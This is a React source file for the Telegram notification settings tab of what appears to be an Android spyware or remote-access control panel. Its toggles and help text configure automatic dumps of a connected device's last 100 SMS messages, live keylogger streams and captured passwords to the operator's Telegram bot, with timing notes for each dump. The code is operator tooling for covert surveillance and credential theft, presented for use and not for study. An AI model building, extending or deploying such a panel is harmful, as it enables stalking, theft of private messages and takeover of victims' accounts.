import React, { useState, useEffect } from 'react';

function Toggle({ value, onChange, label, description }) {
  return (
    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '12px 0', borderBottom: '1px solid #1e293b' }}>
      <div style={{ flex: 1, marginRight: 16 }}>
        <div style={{ fontSize: 13, fontWeight: 600, color: '#e2e8f0' }}>{label}</div>
        {description && <div style={{ fontSize: 11, color: '#64748b', marginTop: 2, lineHeight: 1.5 }}>{description}</div>}
      </div>
      <div
        onClick={() => onChange(!value)}
        style={{
          width: 44, height: 24, borderRadius: 12, cursor: 'pointer', flexShrink: 0,
          background: value ? '#7c3aed' : '#334155',
          position: 'relative', transition: 'background 0.2s',
        }}
      >
        <div style={{
          width: 18, height: 18, borderRadius: '50%', background: '#fff',
          position: 'absolute', top: 3, transition: 'left 0.2s',
          left: value ? 23 : 3,
        }} />
      </div>
    </div>
  );
}

export default function TelegramTab() {
  const [loading, setLoading]   = useState(true);
  const [saving, setSaving]     = useState(false);
  const [testing, setTesting]   = useState(false);
  const [toast, setToast]       = useState(null);

  const [botToken, setBotToken]                     = useState('');
  const [chatId, setChatId]                         = useState('');
  const [enabled, setEnabled]                       = useState(true);
  const [notifyConnect, setNotifyConnect]           = useState(true);
  const [sendSmsOnConnect, setSendSmsOnConnect]           = useState(false);
  const [sendKeylogOnConnect, setSendKeylogOnConnect]     = useState(false);
  const [sendPasswordsOnConnect, setSendPasswordsOnConnect] = useState(false);
  const [botTokenSet, setBotTokenSet]                     = useState(false);

  const token   = localStorage.getItem('admin_token') || localStorage.getItem('user_token');
  const headers = { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` };

  const showToast = (msg, type = 'success') => {
    setToast({ msg, type });
    setTimeout(() => setToast(null), 3500);
  };

  const loadSettings = async () => {
    try {
      const r = await fetch('/api/settings', { headers });
      const d = await r.json();
      if (!d.success) return;
      const t = d.telegram || {};
      setBotToken(t.botToken || '');
      setBotTokenSet(!!t.botTokenSet);
      setChatId(t.chatId || '');
      setEnabled(t.enabled !== false);
      setNotifyConnect(t.notifyConnect !== false);
      setSendSmsOnConnect(!!t.sendSmsOnConnect);
      setSendKeylogOnConnect(!!t.sendKeylogOnConnect);
      setSendPasswordsOnConnect(!!t.sendPasswordsOnConnect);
    } catch (_) {
      showToast('Failed to load settings', 'error');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => { loadSettings(); }, []);

  const handleSave = async () => {
    setSaving(true);
    try {
      const body = {
        telegram: {
          botToken: botToken.startsWith('***') ? undefined : botToken,
          chatId, enabled, notifyConnect, sendSmsOnConnect, sendKeylogOnConnect, sendPasswordsOnConnect,
        },
      };
      const r = await fetch('/api/settings', { method: 'POST', headers, body: JSON.stringify(body) });
      const d = await r.json();
      if (d.success) showToast('Notification settings saved');
      else showToast(d.error || 'Save failed', 'error');
    } catch (e) {
      showToast('Network error: ' + e.message, 'error');
    } finally {
      setSaving(false);
    }
  };

  const handleTest = async () => {
    setTesting(true);
    try {
      const body = { botToken: botToken.startsWith('***') ? undefined : botToken, chatId };
      const r = await fetch('/api/settings/telegram/test', { method: 'POST', headers, body: JSON.stringify(body) });
      const d = await r.json();
      if (d.success) showToast('Test message sent! Check your Telegram.');
      else showToast(d.error || 'Test failed', 'error');
    } catch (e) {
      showToast('Network error: ' + e.message, 'error');
    } finally {
      setTesting(false);
    }
  };

  if (loading) return (
    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: 200, color: '#64748b' }}>
      Loading…
    </div>
  );

  return (
    <div style={{ maxWidth: 640, margin: '0 auto', display: 'flex', flexDirection: 'column', gap: 20, paddingBottom: 32 }}>

      {toast && (
        <div style={{
          position: 'fixed', top: 20, right: 20, zIndex: 9999,
          background: toast.type === 'error' ? '#ef4444' : '#22c55e',
          color: '#fff', borderRadius: 8, padding: '10px 18px',
          fontSize: 13, fontWeight: 600, boxShadow: '0 4px 20px rgba(0,0,0,0.4)',
        }}>
          {toast.type === 'error' ? '❌' : '✅'} {toast.msg}
        </div>
      )}

      {/* Header */}
      <div style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 12, padding: '16px 20px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
          <span style={{ fontSize: 28 }}>📢</span>
          <div>
            <div style={{ fontWeight: 700, fontSize: 16 }}>Notifications</div>
            <div style={{ fontSize: 12, color: '#94a3b8' }}>
              Configure your Telegram bot and choose which events to receive
            </div>
          </div>
        </div>
      </div>

      {/* Bot Config */}
      <div style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 12, padding: '20px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 18 }}>
          <span style={{ fontSize: 20 }}>✈️</span>
          <div style={{ fontWeight: 700, fontSize: 14 }}>Telegram Bot</div>
        </div>

        <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
          <div>
            <label style={{ fontSize: 12, color: '#94a3b8', display: 'block', marginBottom: 6 }}>
              Bot Token
              {botTokenSet && <span style={{ marginLeft: 8, color: '#22c55e', fontSize: 10 }}>● Configured</span>}
            </label>
            <input
              type="password"
              value={botToken}
              onChange={e => setBotToken(e.target.value)}
              placeholder={botTokenSet ? 'Leave blank to keep existing token' : 'Paste your Telegram bot token…'}
              style={inputStyle}
            />
            <div style={{ fontSize: 11, color: '#475569', marginTop: 4 }}>
              Create a bot via{' '}
              <a href="https://t.me/BotFather" target="_blank" rel="noreferrer" style={{ color: '#a78bfa' }}>@BotFather</a>
              {' '}on Telegram, then paste the token here.
            </div>
          </div>

          <div>
            <label style={{ fontSize: 12, color: '#94a3b8', display: 'block', marginBottom: 6 }}>Chat ID</label>
            <input
              type="text"
              value={chatId}
              onChange={e => setChatId(e.target.value)}
              placeholder="e.g. 123456789 or -100123456789 for groups"
              style={inputStyle}
            />
            <div style={{ fontSize: 11, color: '#475569', marginTop: 4 }}>
              Message your bot, then visit{' '}
              <code style={{ background: '#1e293b', padding: '1px 4px', borderRadius: 3 }}>
                api.telegram.org/bot{'<TOKEN>'}/getUpdates
              </code>{' '}
              to find your chat ID.
            </div>
          </div>
        </div>

        <div style={{ display: 'flex', gap: 10, marginTop: 18, justifyContent: 'flex-end' }}>
          <button
            onClick={handleTest}
            disabled={testing || (!botToken && !botTokenSet) || !chatId}
            style={{
              background: 'rgba(124,58,237,0.15)', border: '1px solid rgba(124,58,237,0.4)',
              borderRadius: 8, color: '#a78bfa', padding: '8px 18px', fontSize: 13,
              cursor: 'pointer', fontWeight: 600, fontFamily: 'inherit',
              opacity: (testing || (!botToken && !botTokenSet) || !chatId) ? 0.5 : 1,
            }}
          >
            {testing ? '⏳ Sending…' : '📨 Send Test Message'}
          </button>
        </div>
      </div>

      {/* Notification Events */}
      <div style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 12, padding: '20px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 18 }}>
          <span style={{ fontSize: 20 }}>🔔</span>
          <div>
            <div style={{ fontWeight: 700, fontSize: 14 }}>Notification Events</div>
            <div style={{ fontSize: 11, color: '#94a3b8' }}>Choose what gets sent to your Telegram</div>
          </div>
        </div>

        <div style={{ background: '#0f172a', borderRadius: 8, padding: '4px 14px' }}>
          <Toggle
            value={enabled}
            onChange={setEnabled}
            label="Enable Notifications"
            description="Master switch — turn off to silence all Telegram alerts"
          />
          <Toggle
            value={notifyConnect}
            onChange={setNotifyConnect}
            label="📱 Device Connected Alert"
            description="Receive a formatted banner when a device comes online, showing name, ID, model and Android version"
          />
          <Toggle
            value={sendSmsOnConnect}
            onChange={setSendSmsOnConnect}
            label="💬 Send Last 100 SMS on Connect"
            description="When a device connects, automatically dump its last 100 SMS messages to Telegram as formatted messages"
          />
          <Toggle
            value={sendKeylogOnConnect}
            onChange={setSendKeylogOnConnect}
            label="⌨️ Stream Live Keylogger to Telegram"
            description="Forward live keystrokes to Telegram in real-time, batched every 4 seconds per app"
          />
          <Toggle
            value={sendPasswordsOnConnect}
            onChange={setSendPasswordsOnConnect}
            label="🔑 Send Captured Passwords on Connect"
            description="When a device connects, dump all stored password-field captures to Telegram as formatted HTML"
          />
        </div>

        {sendSmsOnConnect && (
          <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(99,102,241,0.08)', border: '1px solid rgba(99,102,241,0.25)', borderRadius: 8, fontSize: 12, color: '#a5b4fc', lineHeight: 1.6 }}>
            ℹ️ SMS dump fires 3 seconds after the device connects. Large histories are split across multiple Telegram messages automatically.
          </div>
        )}
        {sendKeylogOnConnect && (
          <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(245,158,11,0.08)', border: '1px solid rgba(245,158,11,0.25)', borderRadius: 8, fontSize: 12, color: '#fbbf24', lineHeight: 1.6 }}>
            ⚠️ Live keylogger streaming sends every keystroke to Telegram. High message volume — Telegram may rate-limit your bot.
          </div>
        )}
        {sendPasswordsOnConnect && (
          <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.25)', borderRadius: 8, fontSize: 12, color: '#fca5a5', lineHeight: 1.6 }}>
            🔑 Password dump fires 4 seconds after the device connects. Only entries captured while the device keylogger was active are sent.
          </div>
        )}

        <div style={{ display: 'flex', gap: 10, marginTop: 20, justifyContent: 'flex-end' }}>
          <button
            onClick={handleSave}
            disabled={saving}
            style={{
              background: '#7c3aed', border: 'none', borderRadius: 8,
              color: '#fff', padding: '9px 24px', fontSize: 13,
              cursor: 'pointer', fontWeight: 700, fontFamily: 'inherit',
              opacity: saving ? 0.6 : 1,
            }}
          >
            {saving ? '⏳ Saving…' : '💾 Save Settings'}
          </button>
        </div>
      </div>
    </div>
  );
}

const inputStyle = {
  width: '100%', boxSizing: 'border-box',
  background: '#0f172a', border: '1px solid #2d2d4e', borderRadius: 8,
  padding: '9px 12px', color: '#f0f0ff', fontSize: 13, outline: 'none',
  fontFamily: 'inherit',
};
